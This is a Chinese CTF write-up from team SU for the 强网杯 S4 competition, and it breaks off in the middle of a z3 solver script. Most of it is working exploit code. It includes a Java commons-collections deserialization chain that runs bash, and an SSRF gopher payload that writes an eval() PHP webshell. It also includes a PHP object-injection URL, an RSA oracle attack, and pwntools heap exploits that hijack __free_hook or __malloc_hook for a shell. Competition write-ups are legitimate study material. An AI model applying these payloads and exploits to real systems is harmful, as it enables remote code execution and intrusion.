---
title: 强网杯 S4 SU Write-Up
tags: ["QWB"]
date: 2020-08-24 21:00:00
slug: "qwb-s4-su-wu"
---

本次强网杯比赛我们 SU 取得了线上赛 12th 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：[suers_xctf@126.com](mailto:suers_xctf@126.com)

以下是我们 SU 本次 强网杯 S4 的 writeup 

<!--more-->

##	Web

###	easy_java
绕一下过滤就行
```
package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.AbstractMapBag;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] fake = new Transformer[]{
            new ConstantTransformer("placeholder"),
        };

        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Class.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"forName",  new Class[]{String.class}}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{"java.lang.Runtime"}}),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
            new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"bash", "-c", ""}}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(fake);


        IdentityHashMap identityHashMap = new IdentityHashMap();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(identityHashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "placeholder");

        HashBag hashMap = new HashBag();
        hashMap.add(tiedMapEntry, 1);

        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        identityHashMap.clear();

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);
    }
}
```


###	dice2cry
http://106.14.66.189/abi.php.bak 得到源码
```
<?php
session_start();
header("Content-type:text/html;charset=utf-8");

        $data = json_decode($json_string, true);

        $rand_number = isset($_POST['this_is.able']) ? $_POST['this_is.able'] : mt_rand();
        $n = gmp_init($data['n']);
        $d = gmp_init($data['d']);
        $c = gmp_init($rand_number);
        $m = gmp_powm($c,$d,$n);
        $v3 = gmp_init('3');
        $r = gmp_mod($m,$v3);
        $result=(int)gmp_strval($r);
        $dice = array("num"=>$result);
        $json_obj = json_encode($dice);
        echo $json_obj;
?>
```
可以看到 https://github.com/php/php-src/commit/fc4d462e947828fdbeac6020ac8f34704a218834 这次 commit 修了一个bug，我们可以用`[`绕过 php 对点的转换。web 部分结束
密码学部分：RSA LSB Oracle，不过是mod 3的。把区间改一改就行了

```python
import requests
import json

from Crypto.Util.number import long_to_bytes



cookies = {
    "PHPSESSID": "4fp96q7ik9osjbvuaignpiv70o",
    "encrypto_flag": "3869312711921718181496939729558807189471208864005174371688083330158692727951530885631463620813499380620505887128241566855245089238486494716206458945983582420081939159954313437949593882767853854572863428430644724509166235841551934917025078319846503154318123173991091238707586128668756962224602429656368938289",
    "public_n": "8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157",
    "public_e": "010001",
}

e = 0x10001
c = int(cookies["encrypto_flag"])
n = int(cookies["public_n"], 16)

url = "http://106.14.66.189/abi.php"


def oracle(c):
    data = {"this[is.able":f"{c}"}
    response = requests.post(url, data, cookies=cookies)
    return json.loads(response.content)["num"]

low, high = 0, n

C = c
t = pow(3, e, n)
while low < high - 1:
    C = C*t % n
    res = oracle(C)
    interval = (high - low) // 3
    if res == 0:
        high = high - 2*interval
    elif res == 2*n % 3:
        low, high = low + interval, high - interval
    elif res == n % 3:
        low = low + 2*interval 
    print(res, low, high)

for diff in range(-500, 500):
    if pow(low+diff, e, n) == c:
        print(long_to_bytes(low + diff))
        break
```


![](https://i.loli.net/2020/08/23/f4cTxE8ZLg79o5W.jpg)




###	half_infiltration
http://39.98.131.124/

```
view-source:http://39.98.131.124/?x=a:2:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}}
```
通过`$this`让 php 产生 fatal error 打破 `obstart` 得到源码
```php
<?php 
//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
    $url = $_GET['we_have_done_ssrf_here_could_you_help_to_continue_it'] ?? false; 
	if(preg_match("/flag|var|apache|conf|proc|log/i" ,$url)){
		die("");
	}

	if($url)
    { 

            $ch = curl_init(); 
            curl_setopt($ch, CURLOPT_URL, $url); 
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_exec($ch);
            curl_close($ch); 

     } 

?>
```

```php
<?php


$header = <<<EOF
POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 0
Connection: close
Cookie: PHPSESSID=20vmv3q3hgn1ti6497q4927gk0
Content-Type: application/x-www-form-urlencoded


EOF;

$data = "file=.1.txt&content=1";
$length = strlen($data);
$header = str_replace("Content-Length: 0", "Content-Length: $length", $header);

$a = str_replace("\n", "\r\n", $header);
$a .= $data;

$payload = "gopher://127.0.0.1:40000/_" . (urlencode($a));
$payload = str_replace("+", " ", $payload);
echo $payload;
$payload = urlencode($payload);
system("curl -vv http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=$payload");
```
content 貌似是对 <? php = 有关键字过滤，含有这些的就会被 404 ，猜测是用了`file_put_contents`，并且它支持 php 伪协议写文件，所以可以尝试用 base64 进行绕过

```php
<?php

function get_payload($session, $filename, $content) {
    $header = <<<EOF
POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 0
Connection: close
Cookie: PHPSESSID=$session
Content-Type: application/x-www-form-urlencoded


EOF;

    $data = "file=" . urlencode($filename) . "&content=" . urlencode($content);
    $length = strlen($data);
    $header = str_replace("Content-Length: 0", "Content-Length: $length", $header);

    $a = str_replace("\n", "\r\n", $header);
    $a .= $data;

    $payload = "gopher://127.0.0.1:40000/_" . (urlencode($a));
    $payload = str_replace("+", " ", $payload);
    $payload = urlencode($payload);
    return $payload;
}

$content1 = <<<EOF
PD89IGV2YWwoJF9HRVRbY21kXSk7
EOF;

$payload = get_payload("test222", "php://filter/convert.base64-decode/resource=index.php", $content1);
file_get_contents("http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=$payload");
```


## Pwn
### qwblogin

先逆向过pow,前三个字节直接爆破出来QWQ。之后下断看到是断在了read 0x21的地方。
随便输点东西，跟着后面调试外加看ida的反编译加看官方文档大体可以看出来是将输入的东西分为4组，每组8字节，分别跟一些固定的数字xor，随后cmp对比。
逆向下来是这样的字符串
```python=
'G00DR3VR'+'W31LD0N3'+'Try2Pwn!'+'GOGOGOGO'
```
之后会再进入一个read流程，下断可以看出来是read 0 stack 0x800。stack为程序虚拟的栈空间。
跟c类似的是，这个存在栈溢出。所以最后类似这种形式 0x100*'a'+p64(rbp)+p64(ret_addr)
再调用ret。很明显一个基于vm的栈溢出（指溢出vm的栈跳vm的code
然后回check这个偏移不大于0x1000，也就是跳不出code区，只能用程序原本就带的code来执行。我们写入不了opcode。
因为是类c的写法，所以找gadget也可以参考c的pop ret的方法。去搜索0x11(ret)。
人肉识别下来是有了syscall的所有调用//0x8 0x9 0xa
以及能控制所有的syscall所需要的参数。//a1[0] a1[1] a1[2] a1[3]
之后用程序自带的orw功能去搞就行。
```python=
from pwn import *
flag=chr(0x51)+chr(0x57)+chr(0x51)
i=0
def gd(cmd=''):
    gdb.attach(r,cmd)
    pause()

#r=process('sh','./launch.sh')
#r=process(['./emulator','./test.bin'])
r=remote('47.94.20.173',32142)
r.recvuntil('password:')
r.send(flag)
#gd('b *$rebase(0x1272)')
r.sendline('G00DR3VR'+'W31LD0N3'+'Try2Pwn!'+'GOGOGOGO')
#gd()
syscall9=0x617
syscall=0x5b0+1
sy=0x6ed
p0r=0x2f5
p1r=0x377
p2r=0x45c
p3r=0x4e1
#gd('b read')p64(p0r)+p64(2)
payload='a'*0x108
payload+=p64(p0r)+p64(1)+p64(p1r)+p64(0)+p64(p2r)+p64(0x100)+p64(p3r)+p64(0x40)+p64(syscall)+p64(p0r)+p64(0)+p64(p1r)+p64(0x100)+p64(p2r)+p64(0)+p64(sy)+p64(p0r)+p64(1)+p64(p1r)+p64(4)+p64(p2r)+p64(0x200)+p64(p3r)+p64(0x100)+p64(syscall)+p64(p0r)+p64(2)+p64(p1r)+p64(1)+p64(p2r)+p64(0x1ff)+p64(p3r)+p64(0x100)+p64(syscall)
r.send(payload)
sleep(0.1)
r.send('./flag')
r.interactive()
```
### direct
负数溢出，在edit的时候，offset可以为负数，这种情况下可以去修改chunk的size以及向上修改很长的区域。
但没有leak函数。打stdout因为没有任何跟io有关的操作也实现不了。
在readdir那边的操作时候，可以先readdir完随后通过修改size分配unsorted bin去写入libc地址，然后给下一个将被readdir给读取出来的字符串连起来。
最后一发入魂。
```python=
from pwn import*

def menu(ch):
	r.sendlineafter('Your choice: ',str(ch))
def add(index,size):
	menu(1)
	r.sendlineafter('Index:',str(index))
	r.sendlineafter('Size: ',str(size))
def edit(index,offset,size,content):
	menu(2)
	r.sendlineafter('Index: ',str(index))
	r.sendlineafter('Offset: ',str(offset))
	r.sendlineafter('Size: ',str(size))
	r.sendafter('Content: ',content)
def free(index):
	menu(3)
	r.sendlineafter('Index: ',str(index))
def openfile():
	menu(4)
def closefile():
	menu(5)
def gd(cmd=''):
	gdb.attach(r,cmd)
	pause()

#r = process('./direct')
r=remote('106.14.214.3',1912)
libc =ELF('./libc-2.27.so')
add(0,0x50)
openfile()
closefile()
add(1,0x100)
add(2,0x90)
add(3,0x90)
add(4,0x90)
edit(0,-0x10,0x10,p64(0)+p64(0x80a1))
free(0)
add(0,0xe0)
edit(1,-0x7fe8,0x50,'a'*0x37+'b')
closefile()
r.recvuntil('aaaab')
leak=u64(r.recv(6).ljust(8,'\x00'))
print hex(leak)
lbase=leak-96-0x10-libc.symbols['__malloc_hook']
free(2)
free(3)
#gd()
edit(4,-0xa0,0x10,p64(lbase+libc.symbols['__free_hook']))
edit(4,0,0x10,'/bin/sh')
add(5,0x90)
add(6,0x90)
edit(6,0,0x10,p64(lbase+libc.symbols['system']))
r.interactive()
```

### easypwn
首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作
```python=
from pwn import*
#context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(size):
	menu(1)
	p.sendlineafter('size:',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('idx:',str(index))
	p.sendafter('content:',	content)
def free(index):
	menu(3)
	p.sendlineafter('idx:',str(index))
def F(index):
	sleep(0.05)
	p.sendline('3')
	sleep(0.05)
	p.sendline(str(index))
def E(index,content):
	sleep(0.05)
	p.sendline('2')
	sleep(0.05)
	p.sendline(str(index))
	sleep(0.05)
	p.send(content)
	
while True:
	p  = process('./main')
	libc =ELF('./libc-2.23.so')
#	p = remote('39.101.184.181',10000)
	try:
		new(0x18)	#0
		new(0x2F8)  #1
		new(0x2F8)  #2
		new(0x380)  #3
		new(0x380)  #4
		new(0x380)  #5
		new(0x380)  #6
		new(0x380)  #7
		edit(7,(p64(0) + p64(0x21))*0x38)
		new(0x18)   #8
		free(0)
		edit(1,'\x00'*0x2F0 + p64(0x320))
		free(2)
		####################
		new(0x18)   #0
		new(0x78)   #2
		new(0x78)   #9
		new(0xF8)   #10
		new(0x88)   #11
		new(0x68)   #12
		new(0x2F8)  #13

		free(2)
		edit(9,'\x00'*0x70 + p64(0x100))
		free(10)
		new(0x78) #2
		new(0x78) #10 = 9
		new(0xF8) #14


		free(2)
		edit(1,p64(0) + '\xE8\x37\n')
		new(0x70)
		edit(1,'\x00'*0x78 + p64(0x1631) +  '\n')
		free(9)

		E(1,'\x00'*0x78 + p64(0x1651) + '\n')
		F(10)
		libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 131 - libc.sym['_IO_2_1_stdout_']
		log.info('LIBC:\t' + hex(libc_base))
		malloc_hook = libc_base + libc.sym['__malloc_hook']
		rce = libc_base + 0xF0364
		free(12)
		edit(1,'\x00'*0x288 + p64(0x71) + p64(malloc_hook - 0x23) + '\n')
		new(0x60) #9
		new(0x60) #10
		edit(10,'\x00'*0x13 + p64(rce) + '\n')
		new(0x10)
		break
	except:
		p.close()
		continue
p.interactive()
```

### oldschool
审计一下给的源文件即可知道,在mmap_edit中因为 < 和 > 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset>>2 才是正确的offset,之后就是往free_hook写入一个system,free('/bin/sh')即可getshell
```python=
from pwn import*
context.log_level ='DEBUG'
def menu(ch):
	p.sendlineafter('Your choice:',str(ch))
def new(index,size):
	menu(1)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Size: ',str(size))
def edit(index,content):
	menu(2)
	p.sendlineafter('Index: ',str(index))
	p.sendafter('Content: ',content)
def show(index):
	menu(3)
	p.sendlineafter('Index: ',str(index))
def free(index):
	menu(4)
	p.sendlineafter('Index: ',str(index))
def m_new(index):
	menu(6)
	p.sendlineafter('start: ',str(index))
def m_edit(index,value):
	menu(7)
	p.sendlineafter('Index: ',str(index))
	p.sendlineafter('Value: ',str(value))
def m_free():
	menu(8)
p = process('./main')
libc =ELF('./libc-2.27.so')
p = remote('106.14.214.3',2333)
for i in range(8):
	new(i,0x100)
for i in range(8):
	free(7 - i)
for i in range(7):
	new(i + 1,0x100)

show(1)
p.recvuntil('Content: ')
heap_base = u32(p.recv(4)) - 0x380
log.info('HEAP:\t' + hex(heap_base))

new(0,0x78)
new(8,0x78)
edit(1,'/bin/sh\n')
show(0)
libc_base = u32(p.recvuntil('\xF7')[-4:]) - libc.sym['__malloc_hook'] - 0xD8
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
log.info('LIBC:\t' + hex(libc_base))
rce = libc_base + 0x3D130
m_new(0)
address = ((free_hook - 0xE0000000)>>2)
m_edit(address,system)
free(1)

p.interactive()
```

## Misc
### miscstudy
![](https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png)

找到一个访问 http://39.99.247.28/fonts/1 的流量

![](https://hackmd.summershrimp.com/uploads/upload_7456417605938132686ff20660e7d9ff.png)

得到flag{level1_begin_and_level2_is_come

还从中得到了私钥信息，将其导入Wireshark可以解密后续的部分TLS流量。

继续往后翻stream，可以发现一个图片：
![](https://hackmd.summershrimp.com/uploads/upload_d374609201cbd3daf43e87e452f03c30.png)

访问 https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png 下载图片

在末尾能看到一串类似base64编码的字符串：

![](https://hackmd.summershrimp.com/uploads/upload_96ed59c4dba7593974234283b98b6ca3.png)

解码得到level3_start_it



![](https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png)


在文件末尾的上面，也能发现3串base64编码后的字符串，对其分别解码后得到一串长度为3600的01字符串，按照每60个一行，可以得到一个二维码：

```python
from PIL import Image

x = 60
y = 60

black = (0,0,0)
white = (255, 255, 255)

data = "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
img = Image.new("RGB", (x,y))
for i in range(0, x):
    for j in range(0, y):
        if data[i+j*60] == "0":
            img.putpixel((i,j), white)
        else:
            img.putpixel((i,j), black)
            
img.show()
```
![](https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png)


扫描得到
链接：https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug 提取码：1lms

下载得到level4.zip

![](https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png)

stegbreak，密码power123

JPHS提取得到
```
https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
mrpt

level4_here_all
```

![](https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png)

level5_is_aaa

level6.zip中有3个txt文件，crc爆破得到level6_isready

level7.zip明文碰撞1.png，再水印隐写可以得到level7ishere和39.99.247.28/final_level/

源码里看到

![](https://hackmd.summershrimp.com/uploads/upload_f6df4e39c4e1ca6dcb47e51e2d442ff5.png)

Snow隐写 解密得到the_misc_examaaaaaaa_!!!}


flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}


## Rev
### xx_warmup_obf

ELF逆向，里面全是混淆，使用pin改了一个插件出来，可以用来统计运行过的指令地址，编写idapython，将未运行的指令patch成nop，可以看到程序多了很多函数，大概流程就是：输入，判断长度28，然后进入到一个解方程的地方，解方程即可

```
# -*- coding: UTF-8 -*-
from z3 import *
s = Solver()
key = [BitVec('%d'%i,8) for i in range(28)]
s.add(key[0] == ord('f'))
s.add(key[1] == ord('l'))
s.add(key[2] == ord('a'))
s.add(key[3] == ord('g'))
s.add(key[4] == ord('{'))
s.add(key[27] == ord('}'))
s.add(key[23] == ord('_'))
s.add(23925 * key[0] == 2440350)
s.add(281400 * key[1] - 7037 * key[0] == 29673426)
s.add(174826 * key[0] - 255300 * key[2] - 283573 * key[1] == -37557732)
s.add( 259881 * key[2] + -98445 * key[1] - 276718 * key[0] + 4524 * key[3] == -13182867 )
s.add( 285576 * key[2] + -274569 * key[3] + 94721 * key[0] - 228216 * key[4] - 60353 * key[1] == -25506885 )
s.add( 17630 * key[0]+ -258397 * key[3]+ -244952 * key[1]+ -244086 * key[2]+ -130259 * key[5]- 190371 * key[6]- 109961 * key[4] == -111027477 )
s.add( 117817 * key[5] + 268397 * key[7] + -198175 * key[1] + 18513 * key[2] + 218992 * key[6] + -6727 * key[3] + 228408 * key[0] + 224658 * key[4] == 78775012 )
s.add(260927 * key[3]+ -5496 * key[1]+ -294195 * key[4]+ 264844 * key[2]+ 125853 * key[5] - 153661 * key[0] == 13075233  )
s.add( -196269 * key[8] + -64473 * key[7] + -142792 * key[5] + 171321 * key[4] + -39259 * key[9] + -269632 * key[2] + 229049 * key[6] + 96631 * key[3] - 280754 * key[1] - 168397 * key[0] == -70797046 )
s.add( -235026 * key[4] + 162669 * key[8] + -256202 * key[1] + -32946 * key[9] + -25900 * key[2] + 195039 * key[10] + 182157 * key[3] + 292706 * key[0] + -93524 * key[5] + 121516 * key[6] + 165207 * key[7] == 28263339 )
s.add( -288418 * key[3] + -218493 * key[7] + -236774 * key[0] + 77982 * key[2] + 190784 * key[4] + -84462 * key[1] + 92684 * key[8] + 52068 * key[5] - 243023 * key[6] == -52520267 )
s.add( -262820 * key[4] + 9710 * key[10] + 71182 * key[12] + -184125 * key[1] + -100280 * key[6] + 62018 * key[11] + 141532 * key[9] + -138253 * key[8] + 20489 * key[0] + -214348 * key[2] + 162962 * key[3] - 93199 * key[7] + 147171 * key[5] == -31396844 )
s.add( -131770 * key[6] + -92964 * key[9] + -111160 * key[8] + -258188 * key[7] + 133728 * key[1] + -272650 * key[5] + -4940 * key[10] + 272791 * key[3] + 80519 * key[2] + -165434 * key[11] + 50166 * key[0] + 148713 * key[4] == -22025185 )
s.add(-55254 * key[8]+ 220404 * key[12]+ -86956 * key[10]+ -200702 * key[5]+ -51437 * key[1]+ 25739 * key[6]+ 122945 * key[3]+ 116256 * key[7]+ 22859 * key[4]+ -61880 * key[9]+ -119275 * key[2]+ -224754 * key[13]- 75412 * key[0]+ 59999 * key[11] == -37063008)
s.add(111310 * key[0]+ 198502 * key[3]+ -189890 * key[13]+ 278745 * key[5]+ 157462 * key[9]+ 135809 * key[4]+ -2621 * key[2]+ 67553 * key[6]+ 144834 * key[1]+ -88326 * key[11]+ -228149 * key[10]+ 233663 * key[14]+ -249960 * key[12]+ 300012 * key[8]+ 91783 * key[7] == 93457153)
s.add(15897 * key[0]+ -11943 * key[13]+ 194067 * key[3]+ 125666 * key[2]+ 104421 * key[12]+ -181764 * key[5]+ -233813 * key[8]+ -235783 * key[4]+ 230636 * key[11]+ 148005 * key[6]+ -48167 * key[14]+ -163572 * key[9]+ 54553 * key[10]+ -129997 * key[1]+ 114175 * key[7]- 251681 * key[15] == -36640750)
s.add( -90549 * key[3]+ -228520 * key[14]+ 34835 * key[10]+ -203538 * key[15]+ 272318 * key[13]+ -68478 * key[8]+ 22454 * key[9]+ 74128 * key[12]+ 70051 * key[6]+ -289940 * key[7]+ -52501 * key[5]+ -1254 * key[4]+ 154844 * key[11]+ 254969 * key[2]+ -39495 * key[1]+ 277429 * key[16]- 132752 * key[0] == -6628237 )
s.add( 128092 * key[11]+ -5873 * key[17]+ -144172 * key[3]+ -148216 * key[13]+ 189050 * key[2]+ 66107 * key[5]+ 237987 * key[0]+ -53271 * key[9]+ -86968 * key[12]+ -94616 * key[10]+ -247882 * key[8]+ -5107 * key[1]+ 55085 * key[15]+ 10792 * key[14]+ -112241 * key[4]+ -36680 * key[16]- 210718 * key[7]- 249539 * key[6] == -53084017 )
s.add( -186088 * key[2]+ 19517 * key[13]+ -65515 * key[5]+ 195447 * key[1]+ 145470 * key[14]+ 58825 * key[16]+ 272227 * key[15]+ -155443 * key[8]+ 100397 * key[3]+ -238861 * key[18]+ 84628 * key[7]+ 1337 * key[17]+ 156976 * key[12]+ -74209 * key[4]+ 175077 * key[11]+ 134548 * key[0]+ -280672 * key[6]+ 12264 * key[10] + 56937 * key[9] == 60764977 )
s.add( -58873 * key[7]+ -283834 * key[9]+ 159144 * key[13]+ -199631 * key[0]+ 54404 * key[16]+ -190345 * key[8]+ 176103 * key[3]+ 137206 * key[17]+ -170051 * key[6]+ 281718 * key[11]+ 137214 * key[14]+ -104395 * key[19]+ -122090 * key[4]+ 162065 * key[15]+ -36580 * key[18]+ 245858 * key[12]+ -18520 * key[10]+ -138274 * key[1]+ 139185 * key[2]- 197535 * key[5] == 4912728 )
s.add( 293345 * key[9]+ 63329 * key[13]+ 74470 * key[8]+ -72984 * key[11]+ -162393 * key[20]+ 150036 * key[15]+ 127913 * key[19]+ 181147 * key[16]+ 27751 * key[6]+ -239133 * key[1]+ -28337 * key[17]+ 108149 * key[0]+ 148338 * key[2]+ 38137 * key[18]+ -199427 * key[14]+ -97284 * key[4]+ -39775 * key[3]+ -109205 * key[10]+ 270604 * key[5]- 193384 * key[12]+ 168963 * key[7] == 45577809 )
s.add( 45637 * key[6]+ 111858 * key[17]+ 244009 * key[19]+ -188979 * key[8]+ -220539 * key[16]+ 246135 * key[2]+ -174651 * key[14]+ 179514 * key[4]+ 153071 * key[15]+ -207716 * key[21]+ 64641 * key[7]+ 293781 * key[12]+ 263208 * key[10]+ 44675 * key[1]+ 131692 * key[3]+ 109605 * key[11]+ 293201 * key[5]+ -98937 * key[9]+ 60492 * key[20]+ -273571 * key[13]- 38942 * key[0]- 285946 * key[18] == 77539017 )
s.add( -160726 * key[9]+ 234971 * key[18]+ 32897 * key[4]+ -206184 * key[11]+ -86224 * key[20]+ 92896 * key[22]+ 295735 * key[15]+ -58530 * key[0]+ -197632 * key[13]+ -21957 * key[17]+ -43684 * key[6]+ -141434 * key[10]+ -194890 * key[1]+ -148390 * key[21]+ 105293 * key[14]+ 76213 * key[3]+ 9791 * key[12]+ -258754 * key[8]+ 59119 * key[16]+ 255675 * key[2]+ -130852 * key[7]- 71444 * key[5]+ 127285 * key[19] == -38197685 )
s.add( 205675 * key[20]+ 197685 * key[1]+ 144870 * key[4]+ 120347 * key[10]+ 202621 * key[14]+ -236806 * key[17]+ 268813 * key[3]+ 191822 * key[23]+ -40848 * key[6]+ 103466 * key[7]+ -211930 * key[5]+ -180522 * key[19]+ -188959 * key[15]+ -238839 * key[21]+ 281705 * key[11]+ 175825 * key[16]+ -44618 * key[12]+ 196370 * key[0]+ 89330 * key[22]+ -133696 * key[8]+ -60213 * key[2]+ 191404 * key[18]- 291063 * key[9]+ 13902 * key[13] == 67763764 )
s.add( 69341 * key[15]+ -19740 * key[21]+ 62004 * key[10]+ 29334 * key[8]+ -78459 * key[1]+ -261617 * key[3]+ 115716 * key[22]+ 7838 * key[16]+ -173902 * key[14]+ 115189 * key[9]+ 234832 * key[7]+ -54321 * key[5]+ -268221 * key[20]+ -210563 * key[18]+ -161113 * key[13]+ -199130 * key[23]+ -94067 * key[24]+ 9601 * key[11]+ -8509 * key[12]+ 14439 * key[2]+ -243227 * key[19]+ 37665 * key[17]+ 91076 * key[6]- 85246 * key[0]+ 39558 * key[4] == -98330271 )
s.add( 38468 * key[19]+ -75568 * key[2]+ 169299 * key[22]+ -252915 * key[3]+ 32044 * key[24]+ -260264 * key[8]+ -111200 * key[1]+ -78437 * key[20]+ -212633 * key[16]+ 180400 * key[5]+ -81477 * key[12]+ 232645 * key[0]+ -65268 * key[4]+ 263000 * key[6]+ 247654 * key[25]+ -242059 * key[17]+ -35931 * key[9]+ -271816 * key[21]+ 10191 * key[13]+ 41768 * key[23]+ 92844 * key[7]+ -73366 * key[14]+ -124307 * key[10]+ 197710 * key[18]+ 226192 * key[15]+ 3788 * key[11] == -13464859 )
s.add( -23897 * key[9]+ -188087 * key[24]+ -254282 * key[15]+ -102361 * key[23]+ -15606 * key[14]+ -74795 * key[21]+ 116581 * key[12]+ 77693 * key[5]+ -6866 * key[25]+ 215574 * key[22]+ 231326 * key[6]+ 77915 * key[2]+ 186585 * key[3]+ 219151 * key[4]+ 271210 * key[13]+ -78913 * key[20]+ 83918 * key[8]+ -153409 * key[18]+ -84952 * key[7]+ -121854 * key[0]+ -253617 * key[26]+ -213665 * key[19]+ -293146 * key[17]+ -166693 * key[16]+ -206964 * key[1]- 155664 * key[10]+ 180598 * key[11] == -55504393 )
